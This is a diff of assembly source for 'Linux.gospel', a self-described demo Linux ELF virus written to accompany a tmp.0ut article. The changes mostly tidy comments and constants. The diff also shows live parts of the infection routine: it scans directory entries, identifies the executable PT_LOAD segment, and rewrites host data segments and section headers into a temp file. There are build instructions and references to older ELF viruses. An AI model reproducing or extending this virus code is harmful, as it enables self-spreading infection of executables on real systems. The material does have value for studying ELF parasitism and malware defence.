@@ -2,7 +2,6 @@ BITS 64
 
 
 ;*******************************************************************************
-; ********************
 ; Linux.gospel
 ; Written by ic3qu33n
 ; ********************
@@ -15,10 +14,9 @@ BITS 64
 ; It relies on the use of padding bytes between segments as a page-aligned 
 ; region of available memory.
 ;
-;
 ; This demo virus is created as the accompaniment to my article 
 ; “u used 2 call me on my polymorphic shell phone, pt. 1:  
-;  gospel for a new epoch”
+; gospel for a new epoch”
 ; to be released in tmp.0ut volume 3.
 ;
 ; **********************
@@ -30,26 +28,19 @@ BITS 64
 ; for consistency):
 ; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998  
 ; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
-;
-;
 ; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
 ; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
 ; (navigate to it from this page; I’m not putting the link to the tarball 
 ; here so you don't accidentally download it. yw.)
-;
 ; [13] “Skeksi virus,” elfmaster
 ; https://github.com/elfmaster/skeksi_virus 
-;
-;
 ; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
 ; https://tmpout.sh/1/Linux.Nasty.asm 
-;
 ;
 ; ************************
 ; How to assemble gospel:
 ; ************************
-;
-;The Makefile in this repo can be used to assemble gospel.
+; The Makefile in this repo can be used to assemble gospel.
 ; Alternatively, to assemble gospel, you will need
 ; i. nasm
 ; ii. an x86_64 GNU linker 
@@ -61,9 +52,7 @@ BITS 64
 ; but feel free to use your favorite compatible linker
 ;
 ; To assemble, use the following command:
-;
-; nasm -f elf64 gospel.asm -o gospel.o && x86_64-linux-gnu-ld gospel.o -o gospel
-;
+; nasm -f elf64 gospel.asm -o gospel.o && ld gospel.o -o gospel
 ;
 ; ************************
 ; greetz <3
@@ -76,26 +65,20 @@ BITS 64
 ; richinseattle, jduck, botvx, mrphrazer, lauriewired
 ; zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino, 0daysimpson
 ;
-;
 ; Everyone in the slop pit and all my homies near + far
 ; ilysm xoxoxoxoxoxxo
-;
 ;
 ; *********************************
 ; References:
 ; *********************************
-; 
 ; [1] “Unix Viruses,” Silvio Cesare, 
 ; https://web.archive.org/web/20020604060624/http://www.big.net.au/~silvio/unix-viruses.txt  
 ; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998,
 ; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
-; 
 ; [3 — same as 1, different URL] “UNIX Viruses” Silvio Cesare, October 1998
 ; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm 
-; 
 ; [4] “The VIT(Vit.4096) Virus,” Silvio Cesare, October 1998
 ; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
-; 
 ; [4a]“VIT Virus: VIT description,” Silvio Cesare, October 1998
 ; https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
 ; 
@@ -249,6 +232,8 @@ BITS 64
 
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
+;
+;
 ; r14 + 500 = # of dirent entries returned from getdents64 syscall 
 ;
 ; r14 + 600 = 	struc linuxdirent
@@ -261,7 +246,6 @@ BITS 64
 ;
 ;
 ; r14 + 800 = mmap'd copy of host ELF executable to infect
-;
 ; r14 + 800 	struc elf_ehdr
 ; r14 + 800			.e_ident		resd	1		;unsignedchar
 ; r14 + 804			.ei_class		resb	1		;
@@ -311,7 +295,7 @@ BITS 64
 ; r14 + elf_ehdr.e_phoff + 56	endstruc
 ;
 ;
-;Same breakdown of offsets for the ELF Section Headers:
+; We can use the same breakdown of offsets for the ELF Section Headers:
 ;
 ; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
 ; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
@@ -347,7 +331,7 @@ section .data
 ;SYS_CREAT		equ 0x55
 ;
 ;
-PAGESIZE dd 4096	
+;PAGESIZE dd 4096	
 
 
 ;****************************************************************************************
@@ -417,71 +401,14 @@ PAGESIZE dd 4096
 
 ;variables used for phdr and shdr manipulation routines
 evaddr: dq 0
-
-;original section header offset
-oshoff: dq 0
-
+oshoff: dq 0		;original section header offset
 hostentry_offset: dd 0
-;hosttext_start: dd 0
-
-intermediary_ptload_segment_offset: dq 0
 next_segment_offset: dq 0
-;next_segment_offset: dd 0
-
-;data_offset_new_padding: dd 0
-;data_offset_og: dd 0
-;data_offset_original: dq 0
-;data_offset_padding_size: dd 0
-
-;vxhostentry: dq 0
 vxoffset: dd 0
-;vxdatasegment: dd 0
 vxshoff: dd 0
-ventry equ $_start 
-
-;num_pages: dd 0
+;ventry equ $_start 
 vx_padding_size: dd 0
-;num_pages_padding equ (num_pages * PAGESIZE)
-
-
 fd:	dq 0
-
-STDOUT			equ 0x1
-
-;open() syscall parameter reference 
-;OPEN_RDWR		equ 0x2
-;O_WRONLY		equ 0x1
-;O_RDONLY		equ 0x0
-
-
-;S_IFREG    	dq 0x0100000   ;regular file
-;S_IFMT 		dq 0x0170000
-
-;mode 		dd 0
-;S_ISREG		equ (mode & S_IFMT)
-;;%define S_ISREG(x)	(x&S_IFMT==S_IFREG)
-;%define S_ISREG(x)	x & S_IFMT
-;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file
-
-
-;PROT_READ		equ 0x1
-;PROT_WRITE		equ 0x2
-;MAP_PRIVATE		equ 0x2
-
-;ELF header vals
-;ELFCLASS64 	equ 0x2
-;ETYPE_DYN		equ 0x3
-;ETYPE_EXEC		equ 0x2
-;ELFX8664		equ 0x3e
-
-;D_TYPE values
-;DT_REG 			equ 0x8
-
-;PHDR vals
-;PT_LOAD 	equ 0x1
-;PFLAGS_RX	equ 0x5
-;PFLAGS_RW	equ 0x6
-
 MAX_RDENT_BUF_SIZE equ 0x800
 
 global _start
@@ -489,7 +416,6 @@ default rel
 section .text
 _start:
 	jmp vxstart
-	;db 0x78,0x6f,0x78,0x6f
 	vxsig: db "xoxo",0
 vxstart:
 	push rbp
@@ -578,7 +504,7 @@ process_dirents:
 ;		xor rsi, rsi
 ;		mov rdx, r12
 ;		mov rsi, r13
-;		mov rdi, STDOUT
+;		mov rdi, 0x1 ;STDOUT
 ;		;mov rax, 0x1 ;SYS_WRITE
 ;		mov rax, 0x1 ;0x1 ;SYS_WRITE 
 ;		syscall
@@ -586,7 +512,7 @@ process_dirents:
 ;	
 ;printteststr:
 ;		lea rsi, teststr
-;		mov rdi, STDOUT
+;		mov rdi, 0x1 ;STDOUT
 ;		mov rdx, teststrlen
 ;		mov rax, 0x1 ;SYS_WRITE
 ;		syscall
@@ -786,7 +712,7 @@ payload:
 	pop rsi
 	mov rdx, payload_len
 	mov rax, 0x1 			;SYS_WRITE
-	mov rdi, STDOUT
+	mov rdi, 0x1 ;STDOUT
 	syscall
 	
 	jmp _restore
@@ -866,8 +792,7 @@ infect:
 			cmp word [r13 + r12], 0x1			;check elf_phdr.p_type offset for type PT_LOAD	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				;cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
-				cmp dword [r13 + r12 + 4], 0x5				;elf_phdr.p_flags offset
+				cmp dword [r13 + r12 + 4], 0x5	;elf_phdr.p_flags offset for PFLAG_R | PFLAG_X
 				je .mod_phdr_text_segment			
 				jmp .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
@@ -1110,37 +1035,33 @@ frankenstein_elf:
 	.write_datasegment_totemp:
 		xor r10, r10
 		mov rdx, qword [oshoff]
-		;sub edx, dword [intermediary_ptload_segment_offset]
 		sub edx, dword [next_segment_offset]
-		lea rsi, [r13]										;r13 contains pointer to mmap'd file
-		;add rsi, qword [intermediary_ptload_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
+		lea rsi, [r13]							;r13 contains pointer to mmap'd file
 		add rsi, qword [next_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
-															;following .text segment in mmap'd original host file
+												;following .text segment in mmap'd original host file
 		mov r10d, dword [vx_padding_size]
-		;mov rax, SYS_PWRITE64
-		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
+		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
 ;		jmp .close_temp
 
 	.write_patched_shdrs_totemp:
-		mov rdx, [r14 + 48] 	;filestat.st_size
+		mov rdx, [r14 + 48] 					;filestat.st_size
 		sub rdx, qword [oshoff]
 		lea rsi, [r13]
 		add rsi, qword [oshoff]
 		mov r10d, dword [vxshoff]
-		;mov rax, SYS_PWRITE64
-		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
+		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.munmap_file_work_area:
-		lea rdi, [r13]			;munmap file from work area
-		mov rsi, [r14 + 48] 	;filestat.st_size
-		mov rax, 0xB ;SYS_MUNMAP
+		lea rdi, [r13]							;munmap file from work area
+		mov rsi, [r14 + 48] 					;filestat.st_size
+		mov rax, 0xB 							;SYS_MUNMAP
 		syscall
 
 	.close_temp:		
-		mov rdi, r9				;close temp file
-		mov rax, 0x3 			;SYS_CLOSE
+		mov rdi, r9								;close temp file
+		mov rax, 0x3 							;SYS_CLOSE
 		syscall
 
 
@@ -1148,13 +1069,13 @@ fin_infect:
 	ret
 
 
+PAGESIZE: dd 4096	
 ;;restore stack to original state
 _restore:
 	add rsp, 0x1000
 	mov rsp, rbp
 	pop rbp
 
-;PAGESIZE: dd 4096	
 
 vlen equ $-_start
 _end:
